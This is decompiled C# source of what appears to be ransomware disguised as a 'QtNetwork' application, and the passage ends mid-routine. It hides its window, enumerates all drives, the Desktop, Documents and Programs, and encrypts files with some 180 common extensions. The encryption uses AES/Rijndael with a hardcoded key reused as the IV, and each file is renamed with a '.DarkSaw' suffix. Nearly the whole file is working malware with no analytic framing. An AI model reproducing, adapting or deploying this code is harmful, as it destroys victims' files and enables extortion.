using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using QT7Network.My;

namespace QT7Network;

[DesignerGenerated]
public class form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("BackgroundWorker1")]
	private BackgroundWorker _BackgroundWorker1;

	[AccessedThroughProperty("TextBox11")]
	private TextBox _TextBox11;

	[AccessedThroughProperty("TextBox8")]
	private TextBox _TextBox8;

	[AccessedThroughProperty("TextBox9")]
	private TextBox _TextBox9;

	[AccessedThroughProperty("TextBox6")]
	private TextBox _TextBox6;

	[AccessedThroughProperty("TextBox7")]
	private TextBox _TextBox7;

	[AccessedThroughProperty("TextBox5")]
	private TextBox _TextBox5;

	[AccessedThroughProperty("TextBox4")]
	private TextBox _TextBox4;

	[AccessedThroughProperty("ListBox1")]
	private ListBox _ListBox1;

	[AccessedThroughProperty("TextBox10")]
	private TextBox _TextBox10;

	internal virtual BackgroundWorker BackgroundWorker1
	{
		get
		{
			return _BackgroundWorker1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			DoWorkEventHandler value2 = BackgroundWorker1_DoWork;
			if (_BackgroundWorker1 != null)
			{
				_BackgroundWorker1.DoWork -= value2;
			}
			_BackgroundWorker1 = value;
			if (_BackgroundWorker1 != null)
			{
				_BackgroundWorker1.DoWork += value2;
			}
		}
	}

	internal virtual TextBox TextBox11
	{
		get
		{
			return _TextBox11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox11 = value;
		}
	}

	internal virtual TextBox TextBox8
	{
		get
		{
			return _TextBox8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox8 = value;
		}
	}

	internal virtual TextBox TextBox9
	{
		get
		{
			return _TextBox9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox9 = value;
		}
	}

	internal virtual TextBox TextBox6
	{
		get
		{
			return _TextBox6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox6 = value;
		}
	}

	internal virtual TextBox TextBox7
	{
		get
		{
			return _TextBox7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox7 = value;
		}
	}

	internal virtual TextBox TextBox5
	{
		get
		{
			return _TextBox5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox5 = value;
		}
	}

	internal virtual TextBox TextBox4
	{
		get
		{
			return _TextBox4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox4 = value;
		}
	}

	internal virtual ListBox ListBox1
	{
		get
		{
			return _ListBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListBox1 = value;
		}
	}

	internal virtual TextBox TextBox10
	{
		get
		{
			return _TextBox10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox10 = value;
		}
	}

	public form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_043e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0448: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(form1));
		BackgroundWorker1 = new BackgroundWorker();
		TextBox11 = new TextBox();
		TextBox8 = new TextBox();
		TextBox9 = new TextBox();
		TextBox6 = new TextBox();
		TextBox7 = new TextBox();
		TextBox5 = new TextBox();
		TextBox4 = new TextBox();
		ListBox1 = new ListBox();
		TextBox10 = new TextBox();
		((Control)this).SuspendLayout();
		BackgroundWorker1.WorkerReportsProgress = true;
		BackgroundWorker1.WorkerSupportsCancellation = true;
		TextBox textBox = TextBox11;
		Point location = new Point(12, 35);
		((Control)textBox).set_Location(location);
		((Control)TextBox11).set_Name("TextBox11");
		TextBox textBox2 = TextBox11;
		Size size = new Size(10, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox11).set_TabIndex(47);
		TextBox textBox3 = TextBox8;
		location = new Point(28, 39);
		((Control)textBox3).set_Location(location);
		((Control)TextBox8).set_Name("TextBox8");
		TextBox textBox4 = TextBox8;
		size = new Size(10, 20);
		((Control)textBox4).set_Size(size);
		((Control)TextBox8).set_TabIndex(46);
		TextBox textBox5 = TextBox9;
		location = new Point(28, 39);
		((Control)textBox5).set_Location(location);
		((Control)TextBox9).set_Name("TextBox9");
		TextBox textBox6 = TextBox9;
		size = new Size(12, 20);
		((Control)textBox6).set_Size(size);
		((Control)TextBox9).set_TabIndex(45);
		TextBox textBox7 = TextBox6;
		location = new Point(28, 39);
		((Control)textBox7).set_Location(location);
		((Control)TextBox6).set_Name("TextBox6");
		TextBox textBox8 = TextBox6;
		size = new Size(10, 20);
		((Control)textBox8).set_Size(size);
		((Control)TextBox6).set_TabIndex(44);
		TextBox textBox9 = TextBox7;
		location = new Point(28, 13);
		((Control)textBox9).set_Location(location);
		((Control)TextBox7).set_Name("TextBox7");
		TextBox textBox10 = TextBox7;
		size = new Size(10, 20);
		((Control)textBox10).set_Size(size);
		((Control)TextBox7).set_TabIndex(43);
		TextBox textBox11 = TextBox5;
		location = new Point(12, 35);
		((Control)textBox11).set_Location(location);
		((Control)TextBox5).set_Name("TextBox5");
		TextBox textBox12 = TextBox5;
		size = new Size(10, 20);
		((Control)textBox12).set_Size(size);
		((Control)TextBox5).set_TabIndex(42);
		TextBox textBox13 = TextBox4;
		location = new Point(12, 13);
		((Control)textBox13).set_Location(location);
		((Control)TextBox4).set_Name("TextBox4");
		TextBox textBox14 = TextBox4;
		size = new Size(10, 20);
		((Control)textBox14).set_Size(size);
		((Control)TextBox4).set_TabIndex(41);
		((ListControl)ListBox1).set_FormattingEnabled(true);
		ListBox listBox = ListBox1;
		location = new Point(12, 33);
		((Control)listBox).set_Location(location);
		((Control)ListBox1).set_Name("ListBox1");
		ListBox listBox2 = ListBox1;
		size = new Size(11, 17);
		((Control)listBox2).set_Size(size);
		((Control)ListBox1).set_TabIndex(40);
		TextBox textBox15 = TextBox10;
		location = new Point(12, 12);
		((Control)textBox15).set_Location(location);
		((Control)TextBox10).set_Name("TextBox10");
		TextBox textBox16 = TextBox10;
		size = new Size(10, 20);
		((Control)textBox16).set_Size(size);
		((Control)TextBox10).set_TabIndex(48);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Black);
		size = new Size(10, 17);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)TextBox10);
		((Control)this).get_Controls().Add((Control)(object)TextBox11);
		((Control)this).get_Controls().Add((Control)(object)TextBox8);
		((Control)this).get_Controls().Add((Control)(object)TextBox9);
		((Control)this).get_Controls().Add((Control)(object)TextBox6);
		((Control)this).get_Controls().Add((Control)(object)TextBox7);
		((Control)this).get_Controls().Add((Control)(object)TextBox5);
		((Control)this).get_Controls().Add((Control)(object)TextBox4);
		((Control)this).get_Controls().Add((Control)(object)ListBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("form1");
		((Form)this).set_Opacity(0.01);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_SizeGripStyle((SizeGripStyle)2);
		((Form)this).set_Text("QtNetwork");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Process currentProcess = Process.GetCurrentProcess();
		currentProcess.PriorityClass = ProcessPriorityClass.AboveNormal;
		Thread currentThread = Thread.CurrentThread;
		currentThread.Priority = ThreadPriority.AboveNormal;
		try
		{
			string[] logicalDrives = Directory.GetLogicalDrives();
			string[] array = logicalDrives;
			foreach (string text in array)
			{
				ListBox1.get_Items().Add((object)text);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		checked
		{
			int num = ListBox1.get_Items().get_Count() - 1;
			for (int j = 0; j <= num; j++)
			{
				if (j == 1)
				{
					TextBox4.set_Text(Conversions.ToString(ListBox1.get_Items().get_Item(j)));
				}
				if (j == 2)
				{
					TextBox5.set_Text(Conversions.ToString(ListBox1.get_Items().get_Item(j)));
				}
				if (j == 3)
				{
					TextBox6.set_Text(Conversions.ToString(ListBox1.get_Items().get_Item(j)));
				}
				if (j == 4)
				{
					TextBox7.set_Text(Conversions.ToString(ListBox1.get_Items().get_Item(j)));
				}
				if (j == 5)
				{
					TextBox8.set_Text(Conversions.ToString(ListBox1.get_Items().get_Item(j)));
				}
				if (j == 6)
				{
					TextBox9.set_Text(Conversions.ToString(ListBox1.get_Items().get_Item(j)));
				}
				if (j == 7)
				{
					TextBox10.set_Text(Conversions.ToString(ListBox1.get_Items().get_Item(j)));
				}
				if (j == 8)
				{
					TextBox11.set_Text(Conversions.ToString(ListBox1.get_Items().get_Item(j)));
				}
			}
			BackgroundWorker1.RunWorkerAsync();
		}
	}

	private void BackgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
	{
		Empezar();
	}

	public static IEnumerable<string> BusarArchivos(string ruta, IEnumerable<string> mExtesiones)
	{
		try
		{
			return (from mArchivos in Directory.GetFiles(ruta, "*", SearchOption.AllDirectories)
				where mExtesiones.Contains(Path.GetExtension(mArchivos)!.ToLower())
				select mArchivos).ToList();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			IEnumerable<string> result = (from mArchivos in Directory.GetFiles(ruta, "*", SearchOption.TopDirectoryOnly)
				where mExtesiones.Contains(Path.GetExtension(mArchivos)!.ToLower())
				select mArchivos).ToList();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void RutinaDeCifrado(string nombre, string password)
	{
		byte[] array = new byte[32];
		Encoding.Default.GetBytes(password).CopyTo(array, 0);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.Mode = CipherMode.CBC;
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 256;
		rijndaelManaged.Padding = PaddingMode.Zeros;
		RijndaelManaged rijndaelManaged2 = rijndaelManaged;
		byte[] array2 = File.ReadAllBytes(nombre);
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged2.CreateEncryptor(array, array), CryptoStreamMode.Write);
			cryptoStream.Write(array2, 0, array2.Length);
			byte[] array3 = memoryStream.ToArray();
			byte[] array4 = new byte[checked(array3.Length - 1 + 1)];
			array3.CopyTo(array4, 0);
			File.WriteAllBytes(nombre, array4);
		}
		File.Move(nombre, nombre + ".DarkSaw");
	}

	private void Empezars()
	{
		string text = TextBox4.get_Text();
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(text);
			IEnumerable<string> mExtesiones = new string[180]
			{
				".png", ".exe", ".jpeg", ".Jpg", "mp3", ".txt", ".ins", ".dll", ".doc", ".docx",
				".xls", ".xlsx", ".zip", ".rar", ".config", ".lid", ".wri", ".", ".", ".dll",
				".exe", ".zip", ".rar", ".", ".3dm", ".3g2", ".3gp", ".aaf", ".accdb", ".aep",
				".aepx", ".aet", ".ai", ".aif", ".arw", ".as", ".as3", ".asf", ".asp", ".asx",
				".avi", ".bay", ".bmp", ".cdr", ".cer", ".class", ".cpp", ".cr2", ".crt", ".crw",
				".cs", ".csv", ".dbf", ".dcr", ".der", ".dng", ".doc", ".docb", ".docm", ".docx",
				".dot", ".dotm", ".dotx", ".dwg", ".dxf", ".dxg", ".efx", ".eps", ".erf", ".fla",
				".flv", ".idml", ".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".jar", ".java",
				".jpeg", ".jpg", ".kdc", ".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf", ".mef",
				".mid", ".mov", ".mp3", ".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg", ".nef",
				".nrw", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".orf", ".p12", ".p7b",
				".p7c", ".pdb", ".pdf", ".pef", ".pem", ".pfx", ".php", ".plb", ".pmd", ".pot",
				".potm", ".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm", ".pptx",
				".prel", ".prproj", ".ps", ".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf", ".rar",
				".raw", ".rb", ".rtf", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sql", ".sr2",
				".srf", ".srw", ".svg", ".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2", ".wma",
				".wmv", ".wpd", ".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm", ".xls",
				".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx", ".zip"
			};
			foreach (string item in BusarArchivos(text, mExtesiones))
			{
				RutinaDeCifrado(item, "rodiansergei.socialad@prtotonmail.com@rodiansergei");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Empezar()
	{
		string text = TextBox4.get_Text();
		string text2 = TextBox5.get_Text();
		string text3 = TextBox6.get_Text();
		string text4 = TextBox7.get_Text();
		string text5 = TextBox8.get_Text();
		string text6 = TextBox9.get_Text();
		string text7 = TextBox10.get_Text();
		string text8 = TextBox11.get_Text();
		string desktop = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop();
		string myDocuments = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments();
		string programs = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Programs();
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(text);
			IEnumerable<string> mExtesiones = new string[180]
			{
				".png", ".exe", ".jpeg", ".Jpg", "mp3", ".txt", ".ins", ".dll", ".doc", ".docx",
				".xls", ".xlsx", ".zip", ".rar", ".config", ".lid", ".wri", ".", ".", ".dll",
				".exe", ".zip", ".rar", ".", ".3dm", ".3g2", ".3gp", ".aaf", ".accdb", ".aep",
				".aepx", ".aet", ".ai", ".aif", ".arw", ".as", ".as3", ".asf", ".asp", ".asx",
				".avi", ".bay", ".bmp", ".cdr", ".cer", ".class", ".cpp", ".cr2", ".crt", ".crw",
				".cs", ".csv", ".dbf", ".dcr", ".der", ".dng", ".doc", ".docb", ".docm", ".docx",
				".dot", ".dotm", ".dotx", ".dwg", ".dxf", ".dxg", ".efx", ".eps", ".erf", ".fla",
				".flv", ".idml", ".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".jar", ".java",
				".jpeg", ".jpg", ".kdc", ".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf", ".mef",
				".mid", ".mov", ".mp3", ".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg", ".nef",
				".nrw", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".orf", ".p12", ".p7b",
				".p7c", ".pdb", ".pdf", ".pef", ".pem", ".pfx", ".php", ".plb", ".pmd", ".pot",
				".potm", ".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm", ".pptx",
				".prel", ".prproj", ".ps", ".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf", ".rar",
				".raw", ".rb", ".rtf", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sql", ".sr2",
				".srf", ".srw", ".svg", ".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2", ".wma",
				".wmv", ".wpd", ".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm", ".xls",
				".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx", ".zip"
			};
			foreach (string item in BusarArchivos(text, mExtesiones))
			{
				RutinaDeCifrado(item, "rodiansergei.socialad@prtotonmail.com@rodiansergei");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(desktop);
			IEnumerable<string> mExtesiones2 = new string[180]
			{
				".png", ".exe", ".jpeg", ".Jpg", "mp3", ".txt", ".ins", ".dll", ".doc", ".docx",
				".xls", ".xlsx", ".zip", ".rar", ".config", ".lid", ".wri", ".", ".", ".dll",
				".exe", ".zip", ".rar", ".", ".3dm", ".3g2", ".3gp", ".aaf", ".accdb", ".aep",
				".aepx", ".aet", ".ai", ".aif", ".arw", ".as", ".as3", ".asf", ".asp", ".asx",
				".avi", ".bay", ".bmp", ".cdr", ".cer", ".class", ".cpp", ".cr2", ".crt", ".crw",
				".cs", ".csv", ".dbf", ".dcr", ".der", ".dng", ".doc", ".docb", ".docm", ".docx",
				".dot", ".dotm", ".dotx", ".dwg", ".dxf", ".dxg", ".efx", ".eps", ".erf", ".fla",
				".flv", ".idml", ".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".jar", ".java",
				".jpeg", ".jpg", ".kdc", ".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf", ".mef",
				".mid", ".mov", ".mp3", ".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg", ".nef",
				".nrw", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".orf", ".p12", ".p7b",
				".p7c", ".pdb", ".pdf", ".pef", ".pem", ".pfx", ".php", ".plb", ".pmd", ".pot",
				".potm", ".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm", ".pptx",
				".prel", ".prproj", ".ps", ".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf", ".rar",
				".raw", ".rb", ".rtf", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sql", ".sr2",
				".srf", ".srw", ".svg", ".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2", ".wma",
				".wmv", ".wpd", ".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm", ".xls",
				".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx", ".zip"
			};
			foreach (string item2 in BusarArchivos(desktop, mExtesiones2))
			{
				RutinaDeCifrado(item2, "rodiansergei.socialad@prtotonmail.com@rodiansergei");
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(text2);
			IEnumerable<string> mExtesiones3 = new string[180]
			{
				".png", ".exe", ".jpeg", ".Jpg", "mp3", ".txt", ".ins", ".dll", ".doc", ".docx",
				".xls", ".xlsx", ".zip", ".rar", ".config", ".lid", ".wri", ".", ".", ".dll",
				".exe", ".zip", ".rar", ".", ".3dm", ".3g2", ".3gp", ".aaf", ".accdb", ".aep",
				".aepx", ".aet", ".ai", ".aif", ".arw", ".as", ".as3", ".asf", ".asp", ".asx",
				".avi", ".bay", ".bmp", ".cdr", ".cer", ".class", ".cpp", ".cr2", ".crt", ".crw",
				".cs", ".csv", ".dbf", ".dcr", ".der", ".dng", ".doc", ".docb", ".docm", ".docx",
				".dot", ".dotm", ".dotx", ".dwg", ".dxf", ".dxg", ".efx", ".eps", ".erf", ".fla",
				".flv", ".idml", ".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".jar", ".java",
				".jpeg", ".jpg", ".kdc", ".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf", ".mef",
				".mid", ".mov", ".mp3", ".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg", ".nef",
				".nrw", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".orf", ".p12", ".p7b",
				".p7c", ".pdb", ".pdf", ".pef", ".pem", ".pfx", ".php", ".plb", ".pmd", ".pot",
				".potm", ".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm", ".pptx",
				".prel", ".prproj", ".ps", ".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf", ".rar",
				".raw", ".rb", ".rtf", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sql", ".sr2",
				".srf", ".srw", ".svg", ".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2", ".wma",
				".wmv", ".wpd", ".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm", ".xls",
				".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx", ".zip"
			};
			foreach (string item3 in BusarArchivos(text2, mExtesiones3))
			{
				RutinaDeCifrado(item3, "rodiansergei.socialad@prtotonmail.com@rodiansergei");
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(myDocuments);
			IEnumerable<string> mExtesiones4 = new string[180]
			{
				".png", ".exe", ".jpeg", ".Jpg", "mp3", ".txt", ".ins", ".dll", ".doc", ".docx",
				".xls", ".xlsx", ".zip", ".rar", ".config", ".lid", ".wri", ".", ".", ".dll",
				".exe", ".zip", ".rar", ".", ".3dm", ".3g2", ".3gp", ".aaf", ".accdb", ".aep",
				".aepx", ".aet", ".ai", ".aif", ".arw", ".as", ".as3", ".asf", ".asp", ".asx",
				".avi", ".bay", ".bmp", ".cdr", ".cer", ".class", ".cpp", ".cr2", ".crt", ".crw",
				".cs", ".csv", ".dbf", ".dcr", ".der", ".dng", ".doc", ".docb", ".docm", ".docx",
				".dot", ".dotm", ".dotx", ".dwg", ".dxf", ".dxg", ".efx", ".eps", ".erf", ".fla",
				".flv", ".idml", ".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".jar", ".java",
				".jpeg", ".jpg", ".kdc", ".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf", ".mef",
				".mid", ".mov", ".mp3", ".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg", ".nef",
				".nrw", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".orf", ".p12", ".p7b",
				".p7c", ".pdb", ".pdf", ".pef", ".pem", ".pfx", ".php", ".plb", ".pmd", ".pot",
				".potm", ".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm", ".pptx",
				".prel", ".prproj", ".ps", ".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf", ".rar",
				".raw", ".rb", ".rtf", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sql", ".sr2",
				".srf", ".srw", ".svg", ".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2", ".wma",
				".wmv", ".wpd", ".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm", ".xls",
				".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx", ".zip"
			};
			foreach (string item4 in BusarArchivos(myDocuments, mExtesiones4))
			{
				RutinaDeCifrado(item4, "rodiansergei.socialad@prtotonmail.com@rodiansergei");
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(text3);
			IEnumerable<string> mExtesiones5 = new string[180]
			{
				".png", ".exe", ".jpeg", ".Jpg", "mp3", ".txt", ".ins", ".dll", ".doc", ".docx",
				".xls", ".xlsx", ".zip", ".rar", ".config", ".lid", ".wri", ".", ".", ".dll",
				".exe", ".zip", ".rar", ".", ".3dm", ".3g2", ".3gp", ".aaf", ".accdb", ".aep",
				".aepx", ".aet", ".ai", ".aif", ".arw", ".as", ".as3", ".asf", ".asp", ".asx",
				".avi", ".bay", ".bmp", ".cdr", ".cer", ".class", ".cpp", ".cr2", ".crt", ".crw",
				".cs", ".csv", ".dbf", ".dcr", ".der", ".dng", ".doc", ".docb", ".docm", ".docx",
				".dot", ".dotm", ".dotx", ".dwg", ".dxf", ".dxg", ".efx", ".eps", ".erf", ".fla",
				".flv", ".idml", ".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".jar", ".java",
				".jpeg", ".jpg", ".kdc", ".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf", ".mef",
				".mid", ".mov", ".mp3", ".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg", ".nef",
				".nrw", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".orf", ".p12", ".p7b",
				".p7c", ".pdb", ".pdf", ".pef", ".pem", ".pfx", ".php", ".plb", ".pmd", ".pot",
				".potm", ".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm", ".pptx",
				".prel", ".prproj", ".ps", ".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf", ".rar",
				".raw", ".rb", ".rtf", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sql", ".sr2",
				".srf", ".srw", ".svg", ".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2", ".wma",
				".wmv", ".wpd", ".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm", ".xls",
				".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx", ".zip"
			};
			foreach (string item5 in BusarArchivos(text3, mExtesiones5))
			{
				RutinaDeCifrado(item5, "rodiansergei.socialad@prtotonmail.com@rodiansergei");
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(programs);
			IEnumerable<string> mExtesiones6 = new string[180]
			{
				".png", ".exe", ".jpeg", ".Jpg", "mp3", ".txt", ".ins", ".dll", ".doc", ".docx",
				".xls", ".xlsx", ".zip", ".rar", ".config", ".lid", ".wri", ".", ".", ".dll",
				".exe", ".zip", ".rar", ".", ".3dm", ".3g2", ".3gp", ".aaf", ".accdb", ".aep",
				".aepx", ".aet", ".ai", ".aif", ".arw", ".as", ".as3", ".asf", ".asp", ".asx",
				".avi", ".bay", ".bmp", ".cdr", ".cer", ".class", ".cpp", ".cr2", ".crt", ".crw",
				".cs", ".csv", ".dbf", ".dcr", ".der", ".dng", ".doc", ".docb", ".docm", ".docx",
				".dot", ".dotm", ".dotx", ".dwg", ".dxf", ".dxg", ".efx", ".eps", ".erf", ".fla",
				".flv", ".idml", ".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".jar", ".java",
				".jpeg", ".jpg", ".kdc", ".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf", ".mef",
				".mid", ".mov", ".mp3", ".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg", ".nef",
				".nrw", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".orf", ".p12", ".p7b",
				".p7c", ".pdb", ".pdf", ".pef", ".pem", ".pfx", ".php", ".plb", ".pmd", ".pot",
				".potm", ".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm", ".pptx",
				".prel", ".prproj", ".ps", ".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf", ".rar",
				".raw", ".rb", ".rtf", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sql", ".sr2",
				".srf", ".srw", ".svg", ".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2", ".wma",
				".wmv", ".wpd", ".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm", ".xls",
				".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx", ".zip"
			};
			foreach (string item6 in BusarArchivos(programs, mExtesiones6))
			{
				RutinaDeCifrado(item6, "rodiansergei.socialad@prtotonmail.com@rodiansergei");
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(text4);
			IEnumerable<string> mExtesiones7 = new string[180]
			{
				".png", ".exe", ".jpeg", ".Jpg", "mp3", ".txt", ".ins", ".dll", ".doc", ".docx",
